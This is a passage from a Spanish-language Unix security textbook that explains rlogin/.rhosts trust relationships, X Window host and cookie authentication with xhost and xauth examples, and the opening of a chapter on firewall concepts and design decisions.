&#x00A0;amparo:~$&#x00A0;rlogin&#x00A0;-l&#x00A0;toni&#x00A0;rosita
&#x00A0;
&#x00A0;It&#x00A0;is&#x00A0;practically&#x00A0;impossible&#x00A0;to&#x00A0;teach&#x00A0;good&#x00A0;programming&#x00A0;style&#x00A0;to
&#x00A0;students&#x00A0;that&#x00A0;have&#x00A0;had&#x00A0;prior&#x00A0;exposure&#x00A0;to&#x00A0;BASIC:&#x00A0;as&#x00A0;potential
&#x00A0;programmers&#x00A0;they&#x00A0;are&#x00A0;mentally&#x00A0;mutilated&#x00A0;beyond&#x00A0;hope&#x00A0;of
&#x00A0;regeneration.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;--&#x00A0;Dijkstra
&#x00A0;
&#x00A0;rosita:~$&#x00A0;id
&#x00A0;uid=1000(toni)&#x00A0;gid=100(users)&#x00A0;groups=100(users)
&#x00A0;rosita:~$
</literallayout>
<!--l. 1517--><para>Como podemos ver, las relaciones de con&#xFB01;anza entre equipos Unix pueden ser muy &#x00FA;tiles y c&#x00F3;modas, pero al
mismo tiempo muy peligrosas: estamos con&#xFB01;ando plenamente en sistemas remotos, por lo que si su
seguridad se ve comprometida tambi&#x00E9;n se ve la nuestra. Las m&#x00E1;quinas &#xFB01;ables se han de reducir a equipos de
la misma organizaci&#x00F3;n, y administrados por la misma persona; adem&#x00E1;s, es necesario tener siempre presente
que si tenemos habilitados los servicios r-* cualquier usuario puede establecer relaciones de con&#xFB01;anza, lo
que puede suponer una violaci&#x00F3;n de nuestra pol&#x02CA;&#x0131;tica de seguridad. Es conveniente chequear los
directorios $HOME en busca de &#xFB01;cheros .rhosts (en la secci&#x00F3;n  <ulink 
  url="#x1-19400013.2.6"  ><!--ref: scriptrhosts--></ulink> se presentaba un shellscript que
convenientemente plani&#xFB01;cado puede ayudarnos en esta tarea); muchos administradores pre&#xFB01;eren
no complicarse buscando estos &#xFB01;cheros, y con&#xFB01;guran sus sistemas para que en cada $HOME
exista un &#xFB01;chero con este nombre, propiedad de root y con modo 000: as&#x02CA;&#x0131; los usuarios no
tienen ocasi&#x00F3;n de otorgar con&#xFB01;anza a sistemas remotos. Esto se puede conseguir con el siguiente
shellscript:

     </para><literallayout role="verbatim">
&#x00A0;#!/bin/sh
&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;&#x2018;cat&#x00A0;/etc/passwd&#x00A0;|awk&#x00A0;-F:&#x00A0;&#x2019;{print&#x00A0;$6}&#x2019;&#x2018;;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cd&#x00A0;$i
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x003E;&#x00A0;.rhosts
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chmod&#x00A0;0&#x00A0;.rhosts
&#x00A0;done
</literallayout>
<!--l. 1543--><para>Las relaciones de con&#xFB01;anza son transitivas: si una m&#x00E1;quina conf&#x02CA;&#x0131;a en otra, lo hace tambi&#x00E9;n en todas en las que
conf&#x02CA;&#x0131;a ella. De esta forma se crean anillos de con&#xFB01;anza entre m&#x00E1;quinas, y como las relaciones suelen estar
basadas en el nombre del equipo se trata de objetivos ideales para un atacante mediante IP Spoo&#xFB01;ng: si un
pirata consigue hacer pasar su equipo por uno de los con&#xFB01;ables, autom&#x00E1;ticamente ha conseguido acceso &#x2013;
casi ilimitado &#x2013; al resto de las m&#x00E1;quinas.
  </para></section><!--end section--><!--l. 1550--><section 
role="section"><title><abbrev role="title-mark">14.8</abbrev><anchor 
   id="x1-22500014.8"  ></anchor>XWindow</title>
<!--l. 1551--><para>  El entorno X Window proporciona herramientas incre&#x02CA;&#x0131;blemente potentes, pero que si no
son correctamente con&#xFB01;guradas pueden convertirse en peligrosas. Este sistema est&#x00E1; formado
por una serie de piezas que trabajan conjuntamente para ofrecer al usuario &#xFB01;nal un interfaz
gr&#x00E1;&#xFB01;co:
     </para><itemizedlist>
     <listitem>
     <!--l. 1556--><para>La m&#x00E1;s importante de ellas, sobre todo desde el punto de vista de la seguridad es el servidor
     X. Este programa generalmente se ejecuta en la terminal de usuario, y tiene como funci&#x00F3;n
     principal ofrecer unas primitivas b&#x00E1;sicas de dibujo (trazado de rectas, relleno de &#x00E1;reas&#x2026;) sobre
     la pantalla; adem&#x00E1;s gestiona eventos de teclado y rat&#x00F3;n.
     </para></listitem>
     <listitem>
     <!--l. 1561--><para>Las aplicaciones X son programas de usuario que lanzan llamadas contra un servidor X.
     Mientras que el servidor se ejecuta habitualmente en la terminal desde donde conecta el
     usuario las aplicaciones se pueden lanzar desde el mismo equipo o tambi&#x00E9;n desde una m&#x00E1;quina
     m&#x00E1;s potente, de forma que aprovechamos la capacidad de procesamiento de ese equipo pero
     visualizamos el resultado en la terminal gr&#x00E1;&#xFB01;ca; en este caso se ha de indicar a los clientes la
     ubicaci&#x00F3;n del servidor, mediante la variable de entorno $DISPLAY o mediante la opci&#x00F3;n de l&#x02CA;&#x0131;nea
     de comandos &#x2018;-display&#x2019;.
     </para></listitem>
     <listitem>
     <!--l. 1570--><para>El gestor de ventanas es un caso particular de aplicaci&#x00F3;n, ya que se encarga de ofrecer
     un entorno de trabajo m&#x00E1;s amigable al usuario que est&#x00E1; trabajando en la terminal: dibujo de
     marcos, men&#x00FA;s, cerrado de ventanas&#x2026;</para></listitem></itemizedlist>
<!--l. 1574--><para>Es el servidor X Window quien establece su pol&#x02CA;&#x0131;tica de seguridad para permitir a determinados clientes
utilizar sus servicios. Para ello existen dos mecanismos b&#x00E1;sicos: la autenticaci&#x00F3;n por testigo y la
autenticaci&#x00F3;n por m&#x00E1;quina (<citation>[?]</citation>; otros esquemas, como SUN-DES-1, no los vamos a contemplar
aqu&#x02CA;&#x0131;.
  </para><!--l. 1579--><section 
role="subsection"><title><abbrev role="title-mark">14.8.1</abbrev><anchor 
   id="x1-22600014.8.1"  ></anchor>Autenticaci&#x00F3;n por m&#x00E1;quina</title>

<!--l. 1580--><para>  La autenticaci&#x00F3;n por m&#x00E1;quina cliente (host authentication) es el mecanismo m&#x00E1;s simple, pero la seguridad
que proporciona es muy limitada; es &#x00FA;til en entornos donde los clientes X se ejecutan o bien en estaciones
monousuarios o bien en equipos donde todos los usuarios son con&#xFB01;ables (<citation>[?]</citation>). Adem&#x00E1;s, en sistemas antiguos
es el &#x00FA;nico modelo de seguridad disponible, por lo que en ocasiones no queda m&#x00E1;s remedio que limitarse a &#x00E9;l.
Funciona con&#xFB01;gurando el servidor para permitir conexiones a &#x00E9;l provenientes de una lista de m&#x00E1;quinas, por
ejemplo con la orden xhosts:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;xhost&#x00A0;+luisa
&#x00A0;luisa&#x00A0;being&#x00A0;added&#x00A0;to&#x00A0;access&#x00A0;control&#x00A0;list
&#x00A0;anita:~#
</literallayout>
<!--l. 1596--><para>Si ejecutamos la sentencia anterior en la m&#x00E1;quina donde se ejecuta el servidor,
cualquier usuario del sistema remoto estar&#x00E1; autorizado a lanzar aplicaciones contra
&#x00E9;l <anchor 
   id="x1-226001f4"  ></anchor><footnote><para>     En determinados casos, por ejemplo utilizando autenticaci&#x00F3;n SUN-DES-1 o utilizando Kerberos, es posible indicar nombres
de usuario autorizados de cada sistema; no lo veremos aqu&#x02CA;&#x0131; por no ser el caso m&#x00E1;s habitual.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;xterm&#x00A0;-display&#x00A0;anita:0.0&#x00A0;&#x0026;
&#x00A0;[1]&#x00A0;11974
&#x00A0;luisa:~#
</literallayout>
<!--l. 1609--><para>La orden xhost sin opciones nos dar&#x00E1; una lista de los clientes que pueden lanzar aplicaciones contra
el servidor, mientras que la opci&#x00F3;n especial &#x2018;+&#x2019; deshabilitar&#x00E1; este control de acceso, algo que
evidentemente no es recomendable: cualquier usuario de cualquier sistema podr&#x00E1; utilizar nuestro
servidor:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;xhost
&#x00A0;access&#x00A0;control&#x00A0;enabled,&#x00A0;only&#x00A0;authorized&#x00A0;clients&#x00A0;can&#x00A0;connect
&#x00A0;LOCAL:
&#x00A0;INET:anita
&#x00A0;INET:localhost
&#x00A0;INET:luisa
&#x00A0;anita:~#&#x00A0;xhost&#x00A0;+
&#x00A0;access&#x00A0;control&#x00A0;disabled,&#x00A0;clients&#x00A0;can&#x00A0;connect&#x00A0;from&#x00A0;any&#x00A0;host
&#x00A0;anita:~#&#x00A0;xhost
&#x00A0;access&#x00A0;control&#x00A0;disabled,&#x00A0;clients&#x00A0;can&#x00A0;connect&#x00A0;from&#x00A0;any&#x00A0;host
&#x00A0;LOCAL:
&#x00A0;INET:anita
&#x00A0;INET:localhost
&#x00A0;INET:luisa
&#x00A0;anita:~#
</literallayout>
<!--l. 1633--><para>Una medida de seguridad b&#x00E1;sica utilizando este modelo es habilitar la m&#x00E1;quina en nuestra lista de hosts s&#x00F3;lo el
tiempo necesario para que el cliente arranque, y deshabilitarla despu&#x00E9;s; as&#x02CA;&#x0131; la ejecuci&#x00F3;n de la aplicaci&#x00F3;n cliente
funcionar&#x00E1; normalmente, pero no se podr&#x00E1;n lanzar nuevas peticiones al servidor. Tambi&#x00E9;n para eliminar una
direcci&#x00F3;n de la lista utilizamos la orden xhost:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;xhost
&#x00A0;access&#x00A0;control&#x00A0;enabled,&#x00A0;only&#x00A0;authorized&#x00A0;clients&#x00A0;can&#x00A0;connect
&#x00A0;LOCAL:
&#x00A0;INET:anita
&#x00A0;INET:localhost
&#x00A0;INET:luisa
&#x00A0;anita:~#&#x00A0;xhost&#x00A0;-luisa
&#x00A0;luisa&#x00A0;being&#x00A0;removed&#x00A0;from&#x00A0;access&#x00A0;control&#x00A0;list
&#x00A0;anita:~#&#x00A0;xhost
&#x00A0;access&#x00A0;control&#x00A0;enabled,&#x00A0;only&#x00A0;authorized&#x00A0;clients&#x00A0;can&#x00A0;connect
&#x00A0;LOCAL:
&#x00A0;INET:anita
&#x00A0;INET:localhost
&#x00A0;anita:~#
</literallayout>
<!--l. 1657--><para>De esta forma, cuando alguien intente lanzar una aplicaci&#x00F3;n contra nuestro servidor desde un sistema no
autorizado ver&#x00E1; un mensaje de error similar al siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;xterm&#x00A0;-display&#x00A0;anita:0.0
&#x00A0;Xlib:&#x00A0;connection&#x00A0;to&#x00A0;&#x0022;anita:0.0&#x0022;&#x00A0;refused&#x00A0;by&#x00A0;server
&#x00A0;Xlib:&#x00A0;Client&#x00A0;is&#x00A0;not&#x00A0;authorized&#x00A0;to&#x00A0;connect&#x00A0;to&#x00A0;Server
&#x00A0;Error:&#x00A0;Can&#x2019;t&#x00A0;open&#x00A0;display:&#x00A0;anita:0.0
&#x00A0;luisa:~#
</literallayout>
<!--l. 1669--><para>Como hemos dicho, este modelo de seguridad es demasiado vulnerable; por un lado, estamos
autenticando clientes en base a una direcci&#x00F3;n o a un nombre de m&#x00E1;quina, algo f&#x00E1;cilmente falsi&#xFB01;cable
por un atacante. Por otro, aunque los usuarios de los sistemas a los que permitimos utilizar
nuestro servidor sean conocidos, &#xFB01;ables, y amantes de la naturaleza, nada nos demuestra que
sus sistemas sean seguros, por lo que si sus equipos se ven comprometidos, nuestro servidor
tambi&#x00E9;n.
  </para></section><!--end subsection--><!--l. 1676--><section 
role="subsection"><title><abbrev role="title-mark">14.8.2</abbrev><anchor 
   id="x1-22700014.8.2"  ></anchor>Autenticaci&#x00F3;n por testigo</title>
<!--l. 1677--><para>  Este mecanismo de X Window es el m&#x00E1;s seguro, y por tanto el m&#x00E1;s recomendado; en &#x00E9;l, el servidor controla
el acceso de los clientes mediante una &#x2018;cookie&#x2019; MIT-MAGIC-COOKIE-1, que no es m&#x00E1;s que un c&#x00F3;digo de acceso
aleatorio de 128 bits en un formato legible por la m&#x00E1;quina: esta cookie actua como un password
temporal, de forma que s&#x00F3;lo los clientes que conozcan ese password podr&#x00E1;n acceder al servidor. La
cookie es generada por xdm o por el propio usuario al principio de cada sesi&#x00F3;n, con xauth, y
guardada en el &#xFB01;chero $HOME/.Xauthority; a partir de ese momento, los programas clientes leer&#x00E1;n
su valor y lo enviar&#x00E1;n al servidor cada vez que deseen conectar a &#x00E9;l. Podemos comprobar que
poseemos &#x2013; al menos &#x2013; la cookie correspondiente a nuestro display con una orden como la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;xauth&#x00A0;list
&#x00A0;luisa:0&#x00A0;&#x00A0;MIT-MAGIC-COOKIE-1&#x00A0;&#x00A0;8c1d09aab44573a524467c4e8faaaeb5
&#x00A0;luisa/unix:0&#x00A0;&#x00A0;MIT-MAGIC-COOKIE-1&#x00A0;&#x00A0;8c1d09aab44573a524467c4e8faaaeb5
&#x00A0;luisa:~#
</literallayout>
<!--l. 1698--><para>El comando anterior, xauth, se utiliza para manejar la informaci&#x00F3;n de las cookies de cada usuario; por
ejemplo, un uso muy habitual es la transferencia de cookies a m&#x00E1;quinas remotas, para que puedan
as&#x02CA;&#x0131; conectar al servidor X de un determinado equipo. Para ello debemos extraer la cookie de nuestro
$DISPLAY y enviarla al &#xFB01;chero $HOME/.Xauthority del sistema remoto, con una orden como
esta:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;xauth&#x00A0;extract&#x00A0;-&#x00A0;$DISPLAY&#x00A0;|&#x00A0;ssh&#x00A0;anita&#x00A0;-l&#x00A0;toni&#x00A0;xauth&#x00A0;merge&#x00A0;-
&#x00A0;luisa:~#
</literallayout>
<!--l. 1710--><para>Este mecanismo tiene principalmente dos problemas de seguridad: por un lado, las cookies se transmiten en
texto claro por la red, por lo que son susceptibles de ser interceptadas; por otro, al estar guardadas
en el &#xFB01;chero $HOME/.Xauthority, cualquiera que lo pueda leer tendr&#x00E1; acceso a ellas: es muy
importante que este archivo tenga permiso de lectura y escritura s&#x00F3;lo para su propietario, y que
tambi&#x00E9;n tomemos precauciones si los directorios $HOME de los usuarios son exportados v&#x02CA;&#x0131;a
NFS.


</para><!--l. 1--><para>

  </para></section><!--end subsection--></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-22800015"  ></anchor>Cortafuegos: Conceptos te&#x00F3;ricos</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">15.1</abbrev><anchor 
   id="x1-22900015.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Seg&#x00FA;n <citation>[?]</citation>, un &#xFB01;rewall o cortafuegos es un sistema o grupo de sistemas que hace cumplir una pol&#x02CA;&#x0131;tica de
control de acceso entre dos redes. De una forma m&#x00E1;s clara, podemos de&#xFB01;nir un cortafuegos
como cualquier sistema (desde un simple router hasta varias redes en serie) utilizado para
separar &#x2013; en cuanto a seguridad se re&#xFB01;ere &#x2013; una m&#x00E1;quina o subred del resto, protegi&#x00E9;ndola as&#x02CA;&#x0131; de
servicios y protocolos que desde el exterior puedan suponer una amenaza a la seguridad. El
espacio protegido, denominado per&#x02CA;&#x0131;metro de seguridad, suele ser propiedad de la misma
organizaci&#x00F3;n, y la protecci&#x00F3;n se realiza contra una red externa, no con&#xFB01;able, llamada zona de
riesgo.
<!--br/-->
<!--br/-->Evidentemente la forma de aislamiento m&#x00E1;s efectiva para cualquier pol&#x02CA;&#x0131;tica de seguridad consiste en
el aislamiento f&#x02CA;&#x0131;sico, es decir, no tener conectada la m&#x00E1;quina o la subred a otros equipos o a
Internet (&#xFB01;gura  <ulink 
  url="#x1-2290011"  ><!--ref: lanwan--></ulink> (a)). Sin embargo, en la mayor&#x02CA;&#x0131;a de organizaciones &#x2013; especialmente en las de
I+D &#x2013; los usuarios necesitan compartir informaci&#x00F3;n con otras personas situadas en muchas
ocasiones a miles de kil&#x00F3;metros de distancia, con lo que no es posible un aislamiento total. El
punto opuesto consistir&#x02CA;&#x0131;a en una conectividad completa con la red (&#xFB01;gura  <ulink 
  url="#x1-2290011"  ><!--ref: lanwan--></ulink> (b)), lo que desde
el punto de vista de la seguridad es muy problem&#x00E1;tico: cualquiera, desde cualquier parte del
mundo, puede potencialmente tener acceso a nuestros recursos. Un t&#x00E9;rmino medio entre ambas
aproximaciones consiste en implementar cierta separaci&#x00F3;n l&#x00F3;gica mediante un cortafuegos (&#xFB01;gura  <ulink 
  url="#x1-2290011"  ><!--ref: lanwan--></ulink>
(c)).
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 28--><para>
heightwidthdepthfw.png                                                              <graphic width="430.0pt" fileref="fw.png" ></graphic>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2290011"  ></anchor>Figura&#x00A0;15.1</title><para>(a) Aislamiento. (b) Conexi&#x00F3;n total. (c) Firewall entre la zona de riesgo y el per&#x02CA;&#x0131;metro
de seguridad.</para></blockquote>
</para></section>

  </blockquote></figure>
<!--br/-->Antes de hablar de cortafuegos es casi obligatorio dar una serie de de&#xFB01;niciones de partes o caracter&#x02CA;&#x0131;sticas
de funcionamiento de un &#xFB01;rewall; por m&#x00E1;quina o host basti&#x00F3;n (tambi&#x00E9;n se denominan gates) se conoce a un
sistema especialmente asegurado, pero en principio vulnerable a todo tipo de ataques por estar abierto a
Internet, que tiene como funci&#x00F3;n ser el punto de contacto de los usuarios de la red interna de una
organizaci&#x00F3;n con otro tipo de redes. El host basti&#x00F3;n &#xFB01;ltra tr&#x00E1;&#xFB01;co de entrada y salida, y tambi&#x00E9;n esconde la
con&#xFB01;guraci&#x00F3;n de la red hacia fuera.
<!--br/-->
<!--br/-->Por &#xFB01;ltrado de paquetes entendemos la acci&#x00F3;n de denegar o permitir el &#xFB02;ujo de tramas entre dos redes
(por ejemplo la interna, protegida con el &#xFB01;rewall, y el resto de Internet) de acuerdo a unas
normas prede&#xFB01;nidas; aunque el &#xFB01;ltro m&#x00E1;s elemental puede ser un simple router, trabajando en el
nivel de red del protocolo OSI, esta actividad puede realizarse adem&#x00E1;s en un puente o en una
m&#x00E1;quina individual. El &#xFB01;ltrado tambi&#x00E9;n se conoce como screening, y a los dispositivos que lo
implementan se les denomina chokes; el choke puede ser la m&#x00E1;quina basti&#x00F3;n o un elemento
diferente.
<!--br/-->
<!--br/-->Un proxy es un programa (trabajando en el nivel de aplicaci&#x00F3;n de OSI) que permite o niega el acceso a
una aplicaci&#x00F3;n determinada entre dos redes. Los clientes proxy se comunican s&#x00F3;lo con los servidores proxy,
que autorizan las peticiones y las env&#x02CA;&#x0131;an a los servidores reales, o las deniegan y las devuelven a quien las
solicit&#x00F3;.
<!--br/-->
<!--br/-->F&#x02CA;&#x0131;sicamente, en casi todos los cortafuegos existen al menos un choke y una m&#x00E1;quina basti&#x00F3;n, aunque
tambi&#x00E9;n se considera &#xFB01;rewall a un simple router &#xFB01;ltrando paquetes, es decir, actuando como
choke; desde el punto de vista l&#x00F3;gico, en el cortafuegos suelen existir servidores proxy para las
aplicaciones que han de atravesar el sistema, y que se situan habitualmente en el host basti&#x00F3;n.
Tambi&#x00E9;n se implementa en el choke un mecanismo de &#xFB01;ltrado de paquetes, y en alguno de los
dos elementos se suele situar otro mecanismo para poder monitorizar y detectar la actividad
sospechosa.
<!--br/-->
<!--br/-->En este cap&#x02CA;&#x0131;tulo hablaremos de los tipos de cortafuegos m&#x00E1;s habituales y de sus caracter&#x02CA;&#x0131;sticas, as&#x02CA;&#x0131; como de
las posibles pol&#x02CA;&#x0131;ticas de seguridad que pueden implementar; en el siguiente comentaremos aspectos de
algunos de los cortafuegos m&#x00E1;s utilizados hoy en d&#x02CA;&#x0131;a, como FireWall-1 o Cisco PIX Firewall. Los &#xFB01;rewalls
son cada vez m&#x00E1;s necesarios en nuestras redes, pero todos los expertos recomiendan que no
se usen en lugar de otras herramientas, sino junto a ellas; cualquier cortafuegos, desde
el m&#x00E1;s simple al m&#x00E1;s avanzado, presenta dos grav&#x02CA;&#x0131;simos problemas de seguridad: por un lado,
centralizan todas las medidas en un &#x00FA;nico sistema, de forma que si &#x00E9;ste se ve comprometido y el
resto de nuestra red no est&#x00E1; lo su&#xFB01;cientemente protegido el atacante consigue amenazar a toda
la subred simplemente poniendo en jaque a una m&#x00E1;quina. El segundo problema, relacionado
con &#x00E9;ste, es la falsa sensaci&#x00F3;n de seguridad que un cortafuegos proporciona: generalmente un
administrador que no disponga de un &#xFB01;rewall va a preocuparse de la integridad de todas y cada
una de sus m&#x00E1;quinas, pero en el momento en que instala el cortafuegos y lo con&#xFB01;gura asume
que toda su red es segura, por lo que se suele descuidar enormemente la seguridad de los
equipos de la red interna. Esto, como acabamos de comentar, es un grave error, ya que en el
momento que un pirata acceda a nuestro cortafuegos &#x2013; recordemos que es un sistema muy
expuesto a ataques externos &#x2013; autom&#x00E1;ticamente va a tener la posibilidad de controlar toda nuestra
red.
<!--br/-->
<!--br/-->Adem&#x00E1;s &#x2013; esto ya no es un problema de los &#xFB01;rewalls sino algo de sentido com&#x00FA;n &#x2013;, un cortafuegos
evidentemente no protege contra ataques que no pasan por &#x00E9;l: esto incluye todo tipo de ataques internos
dentro del per&#x02CA;&#x0131;metro de seguridad, pero tambi&#x00E9;n otros factores que a priori no deber&#x02CA;&#x0131;an suponer un
problema. El t&#x02CA;&#x0131;pico ejemplo de estos &#x00FA;ltimos son los usuarios que instalan sin permiso, sin conocimiento del
administrador de la red, y muchas veces sin pensar en sus consecuencias, un simple modem en sus PCs o
estaciones de trabajo; esto, tan habitual en muchas organizaciones, supone la violaci&#x00F3;n y la ruptura total
del per&#x02CA;&#x0131;metro de seguridad, ya que posibilita accesos a la red no controlados por el cortafuegos. Otro
problema de sentido com&#x00FA;n es la recon&#xFB01;guraci&#x00F3;n de los sistemas al pasarlos de una zona a otra
con diferente nivel de seguridad, por ejemplo al mover un equipo que se encuentra en el &#x00E1;rea
protegida a la DMZ (veremos m&#x00E1;s adelante lo que estas siglas signi&#xFB01;can); este acto &#x2013; que en

ocasiones no implica ni tan siquiera el movimiento f&#x02CA;&#x0131;sico del equipo, sino simplemente conectarlo
en una toma de red diferente &#x2013; puede ocasionar graves problemas de seguridad en nuestra
organizaci&#x00F3;n, por lo que cada vez que un cambio de este estilo se produzca no s&#x00F3;lo es necesaria la
recon&#xFB01;guraci&#x00F3;n del sistema, sino la revisi&#x00F3;n de todas las pol&#x02CA;&#x0131;ticas de seguridad aplicadas a esa m&#x00E1;quina
(<citation>[?]</citation>).
  </section><!--end section--><!--l. 110--><section 
role="section"><title><abbrev role="title-mark">15.2</abbrev><anchor 
   id="x1-23000015.2"  ></anchor>Caracter&#x02CA;&#x0131;sticas de dise~no</title>
<!--l. 111--><para>  Existen tres decisiones b&#x00E1;sicas en el dise~no o la con&#xFB01;guraci&#x00F3;n de un cortafuegos (<citation>[?]</citation>); la primera de ellas, la
m&#x00E1;s importante, hace referencia a la pol&#x02CA;&#x0131;tica de seguridad de la organizaci&#x00F3;n propietaria del &#xFB01;rewall:
evidentemente, la con&#xFB01;guraci&#x00F3;n y el nivel de seguridad potencial ser&#x00E1; distinto en una empresa que utilice un
cortafuegos para bloquear todo el tr&#x00E1;&#xFB01;co externo hacia el dominio de su propiedad (excepto, quiz&#x00E1;s, las
consultas a su p&#x00E1;gina web) frente a otra donde s&#x00F3;lo se intente evitar que los usuarios internos pierdan el
tiempo en la red, bloqueando por ejemplo todos los servicios de salida al exterior excepto el correo
electr&#x00F3;nico. Sobre esta decisi&#x00F3;n in&#xFB02;uyen, aparte de motivos de seguridad, motivos administrativos de cada
organismo.
<!--br/-->
<!--br/-->La segunda decisi&#x00F3;n de dise~no a tener en cuenta es el nivel de monitorizaci&#x00F3;n, redundancia y control deseado
en la organizaci&#x00F3;n; una vez de&#xFB01;nida la pol&#x02CA;&#x0131;tica a seguir, hay que de&#xFB01;nir c&#x00F3;mo implementarla en el
cortafuegos indicando b&#x00E1;sicamente qu&#x00E9; se va a permitir y qu&#x00E9; se va a denegar. Para esto existen dos
aproximaciones generales: o bien se adopta una postura restrictiva (denegamos todo lo que expl&#x02CA;&#x0131;citamente
no se permita) o bien una permisiva (permitimos todo excepto lo expl&#x02CA;&#x0131;citamente negado); evidentemente
es la primera la m&#x00E1;s recomendable de cara a la seguridad, pero no siempre es aplicable debido a factores no
t&#x00E9;cnicos sino humanos (esto es, los usuarios y sus protestas por no poder ejecutar tal o cual aplicaci&#x00F3;n a
trav&#x00E9;s del &#xFB01;rewall).
<!--br/-->
<!--br/-->Por &#x00FA;ltimo, la tercera decisi&#x00F3;n a la hora de instalar un sistema de cortafuegos es meramente econ&#x00F3;mica: en
funci&#x00F3;n del valor estimado de lo que deseemos proteger, debemos gastar m&#x00E1;s o menos dinero, o no gastar
nada. Un &#xFB01;rewall puede no entra~nar gastos extras para la organizaci&#x00F3;n, o suponer un desembolso de varios
millones de pesetas: seguramente un departamento o laboratorio con pocos equipos en su interior puede
utilizar un PC con Linux, Solaris o FreeBSD a modo de cortafuegos, sin gastarse nada en &#x00E9;l (excepto unas
horas de trabajo y unas tazas de caf&#x00E9;), pero esta aproximaci&#x00F3;n evidentemente no funciona cuando el sistema
a proteger es una red de tama~no considerable; en este caso se pueden utilizar sistemas propietarios, que
suelen ser caros, o aprovechar los routers de salida de la red, algo m&#x00E1;s barato pero que requiere
m&#x00E1;s tiempo de con&#xFB01;guraci&#x00F3;n que los cortafuegos sobre Unix en PC de los que hemos hablado
antes. De cualquier forma, no es recomendable a la hora de evaluar el dinero a invertir en
el &#xFB01;rewall &#xFB01;jarse s&#x00F3;lo en el coste de su instalaci&#x00F3;n y puesta a punto, sino tambi&#x00E9;n en el de su
mantenimiento.
<!--br/-->
<!--br/-->Estas decisiones, aunque concernientes al dise~no, eran b&#x00E1;sicamente pol&#x02CA;&#x0131;ticas; la primera decisi&#x00F3;n t&#x00E9;cnica a la
que nos vamos a enfrentar a la hora de instalar un cortafuegos es elemental: &#x00BF;d&#x00F3;nde lo situamos para que
cumpla e&#xFB01;cientemente su cometido? Evidentemente, si aprovechamos como cortafuegos un equipo ya
existente en la red, por ejemplo un router, no tenemos muchas posibilidades de elecci&#x00F3;n: con toda
seguridad hemos de dejarlo donde ya est&#x00E1;; si por el contrario utilizamos una m&#x00E1;quina Unix con un
cortafuegos implementado en ella, tenemos varias posibilidades para situarla con respecto
a la red externa y a la interna. Sin importar donde situemos al sistema hemos de recordar
siempre que los equipos que queden fuera del cortafuegos, en la zona de riesgo, ser&#x00E1;n igual de
vulnerables que antes de instalar el &#xFB01;rewall; por eso es posible que si por obligaci&#x00F3;n hemos tenido que
instalar un cortafuegos en un punto que no protege completamente nuestra red, pensemos en
a~nadir cortafuegos internos dentro de la misma, aumentando as&#x02CA;&#x0131; la seguridad de las partes m&#x00E1;s
importantes.
<!--br/-->
<!--br/-->Una vez que hemos decidido d&#x00F3;nde situar nuestro cortafuegos se debe elegir qu&#x00E9; elemento o elementos f&#x02CA;&#x0131;sicos
utilizar como basti&#x00F3;n; para tomar esta decisi&#x00F3;n existen dos principios b&#x00E1;sicos (<citation>[?]</citation>): m&#x02CA;&#x0131;nima complejidad y
m&#x00E1;xima seguridad. Cuanto m&#x00E1;s simple sea el host basti&#x00F3;n, cuanto menos servicios ofrezca, m&#x00E1;s f&#x00E1;cil ser&#x00E1; su
mantenimiento y por tanto mayor su seguridad; mantener esta m&#x00E1;quina especialmente asegurada es algo

vital para que el cortafuegos funcione correctamente, ya que va a soportar por s&#x02CA;&#x0131; sola todos los ataques que
se efectuen contra nuestra red al ser elemento m&#x00E1;s accesible de &#x00E9;sta. Si la seguridad de la m&#x00E1;quina basti&#x00F3;n se
ve comprometida, la amenaza se traslada inmediantamente a todos los equipos dentro del per&#x02CA;&#x0131;metro de
seguridad. Suele ser una buena opci&#x00F3;n elegir como m&#x00E1;quina basti&#x00F3;n un servidor corriendo alguna
versi&#x00F3;n de Unix (desde una SPARC con Solaris a un simple PC con Linux o FreeBSD), ya que
aparte de la seguridad del sistema operativo tenemos la ventaja de que la mayor parte de
aplicaciones de &#xFB01;rewalling han sido desarrolladas y comprobadas desde hace a~nos sobre Unix
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Evidentemente, a la vez que elegimos un basti&#x00F3;n para nuestro cortafuegos hemos de decidir qu&#x00E9; elemento
utilizar como choke; generalmente suele ser un router con capacidad para &#xFB01;ltrar paquetes, aunque tambi&#x00E9;n
puede utilizarse un sistema Unix para realizar esta funci&#x00F3;n. En el punto  <ulink 
  url="#x1-23500015.4"  ><!--ref: arq--></ulink> se comentan diferentes
arquitecturas de cortafuegos con los elementos utilizados en cada una de ellas como chokes y como
bastiones.
<!--br/-->
<!--br/-->Ya hemos decidido qu&#x00E9; utilizar como &#xFB01;rewall y d&#x00F3;nde situarlo; una vez hecho esto hemos de implementar
sobre &#x00E9;l los mecanismos necesarios para hacer cumplir nuestra pol&#x02CA;&#x0131;tica de seguridad. En todo cortafuegos
existen tres componentes b&#x00E1;sicos para los que debemos implementar mecanismos (<citation>[?]</citation>): el &#xFB01;ltrado de
paquetes, el proxy de aplicaci&#x00F3;n y la monitorizaci&#x00F3;n y detecci&#x00F3;n de actividad sospechosa. Vamos a hablar a
continuaci&#x00F3;n de cada uno de estos componentes.
  </para></section><!--end section--><!--l. 196--><section 
role="section"><title><abbrev role="title-mark">15.3</abbrev><anchor 
   id="x1-23100015.3"  ></anchor>Componentes de un cortafuegos</title>
